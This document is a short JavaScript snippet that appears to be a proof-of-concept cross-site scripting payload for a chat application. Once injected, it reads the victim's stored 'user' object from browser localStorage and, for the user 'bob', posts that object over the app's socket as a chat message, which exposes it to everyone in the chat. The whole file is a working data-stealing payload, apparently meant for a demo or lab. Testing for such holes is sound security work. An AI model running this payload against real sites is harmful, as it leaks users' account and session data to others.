(async function () {
  if (JSON.parse(localStorage.getItem("user")).username !== "bob") {
    socket.emit(
      "msg",
      "i am not bob but i am still vulnerable to an xss attack"
    );
    return;
  }
  socket.emit(
    "msg",
    "hello my name is bob and i am vulnerable to an xss attack"
  );
  socket.emit("msg", localStorage.getItem("user"));
})();
